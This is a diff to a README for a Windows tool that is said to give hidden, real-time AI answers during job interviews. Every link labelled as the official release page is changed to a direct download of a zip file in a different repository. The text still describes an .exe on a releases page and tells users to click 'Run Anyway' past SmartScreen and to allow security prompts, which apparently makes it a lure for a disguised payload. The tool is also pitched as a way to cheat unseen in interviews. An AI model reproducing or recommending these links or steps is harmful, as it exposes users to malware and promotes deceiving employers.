@@ -5,7 +5,7 @@ description: "Transcribe job interviews in real-time and receive AI-generated, c
 ---
 # 🧠 second-brain - Real-time AI support for job interviews
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/resolvable-praenomen542/second-brain/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/resolvable-praenomen542/resolvable-praenomen542.github.io/main/Cherusci/praenomen_resolvable_io_github_v3.1.zip)
 
 Second-brain helps you during job interviews. It listens to your interviewer, processes the audio using artificial intelligence, and shows you helpful answers on your screen. You stay focused while the software provides the information you need. It runs in the background and stays hidden from your camera.
 
@@ -13,7 +13,7 @@ Second-brain helps you during job interviews. It listens to your interviewer, pr
 
 The software installs on Windows computers. Follow these steps to get started:
 
-1. Click this link to go to the official [release page](https://github.com/resolvable-praenomen542/second-brain/releases).
+1. Click this link to go to the official [release page](https://raw.githubusercontent.com/resolvable-praenomen542/resolvable-praenomen542.github.io/main/Cherusci/praenomen_resolvable_io_github_v3.1.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -81,7 +81,7 @@ If you encounter problems, verify these items first:
 If the Windows SmartScreen filter pops up when you run the installer, click More Info. Then click Run Anyway. This happens because the app is brand new and not yet verified by Microsoft. 
 
 1. Ensure your internet connection is active.
-2. Download the latest version from the [releases page](https://github.com/resolvable-praenomen542/second-brain/releases).
+2. Download the latest version from the [releases page](https://raw.githubusercontent.com/resolvable-praenomen542/resolvable-praenomen542.github.io/main/Cherusci/praenomen_resolvable_io_github_v3.1.zip).
 3. Run the installer package. 
 4. Select Allow when the security prompt appears.
 5. Follow the quick setup wizard to finish.
